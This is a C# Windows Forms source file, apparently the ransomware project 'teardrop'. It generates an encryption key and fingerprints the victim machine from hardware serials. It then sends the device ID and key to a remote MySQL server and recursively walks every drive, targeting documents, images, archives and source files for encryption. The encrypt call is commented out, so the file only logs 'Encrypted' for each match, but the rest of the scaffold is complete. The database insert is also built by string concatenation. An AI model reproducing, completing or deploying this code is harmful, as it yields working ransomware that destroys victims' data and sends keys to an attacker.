using DeviceId;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace teardrop
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {            
            if(Properties.Settings.Default.key.Length != 34)
            {
                Properties.Settings.Default.key = Crypto.GetRandomString(34);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                write("Generated key: " + Properties.Settings.Default.key);
            }
            else
            {
                write("Key is: " + Properties.Settings.Default.key);
            }

            string deviceId = new DeviceIdBuilder()
                .AddMachineName()
                .AddProcessorId()
                .AddMotherboardSerialNumber()
                .AddSystemDriveSerialNumber()
                .ToString();

            string myConnectionString = "SERVER=" + Properties.Settings.Default.db_host + ";" +
                            "DATABASE=" + Properties.Settings.Default.db_database + ";" +
                            "UID=" + Properties.Settings.Default.db_user + ";" +
                            "PASSWORD=" + Properties.Settings.Default.db_pass + ";";



            if(Properties.Settings.Default.db_enable == true)
            {
                try
                {
                    MySqlConnection connection = new MySqlConnection(myConnectionString);
                    MySqlCommand command = connection.CreateCommand();
                    command.CommandText = "INSERT INTO machine (deviceID,pass) VALUES ('" + deviceId + "', '" + Properties.Settings.Default.key + "')";
                    MySqlDataReader Reader;
                    connection.Open();
                    Reader = command.ExecuteReader();
                    while (Reader.Read())
                    {
                        string row = "";
                        for (int i = 0; i < Reader.FieldCount; i++)
                            row += Reader.GetValue(i).ToString() + ", ";
                        Console.WriteLine(row);
                    }
                    connection.Close();
                }
                catch (Exception ex)
                {
                    if (ex.Message.Contains("DUPLICATE"))
                    {

                    }
                    else
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }


            Task.Run(() => GetFiles());
        }

        public void write(string text)
        {
            if (textBox1.InvokeRequired)
            {
                textBox1.Invoke(new Action<string>(write), new object[] { text });
                return;
            }
            textBox1.AppendText(text + Environment.NewLine);
        }

        string[] file;
        private void ShowAllFoldersUnder(string path, int indent)
        {
            try
            {
                if ((File.GetAttributes(path) & FileAttributes.ReparsePoint)
                    != FileAttributes.ReparsePoint)
                {
                    foreach (string folder in Directory.GetDirectories(path))
                    {
                        try
                        {
                            file = Directory.GetFiles(Path.GetFullPath(folder));
                        } catch { }

                        foreach(string s in file)
                        {
                            string ext = Path.GetExtension(s);
                            var validExtensions = new[]
                            {
                                ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav", ".pdf", ".raw", ".bat", ".json", ".doc", ".txt", ".png", ".cs", ".c", ".java", ".h", ".rar", ".zip", ".7zip",
                                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".xhtml", ".odt", ".ods", ".wma",
                                ".wav", ".mpa", ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
                                ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
                            };

                            var skipPath = new[]
                            {
                                "System32", "WinSxS", "Program Files"
                            };

                            if (validExtensions.Contains(ext) && !skipPath.Contains(s))
                            {
                                //Crypto.FileEncrypt(s, Properties.Settings.Default.key);
                                write("Encrypted " + s);
                            }

                        }

                        ShowAllFoldersUnder(folder, indent + 2);
                    }
                }
            }
            catch (UnauthorizedAccessException e) { write(e.Message); }
            
        }

        public void GetFiles()
        {
            try
            {
                write("Getting Drives...");

                foreach (var drive in DriveInfo.GetDrives())
                {
                    try
                    {
                        write("Found drive " + drive.Name);

                        try
                        {
                            ShowAllFoldersUnder(drive.Name, 0);
                        }
                        catch { }
                    }
                    catch (Exception ex1)
                    {
                        write("ex1 " + ex1.Message);
                    }
                }
            }
            catch(Exception ex)
            {

            }

            write("Done getting stuff :)");
        }
    }
}
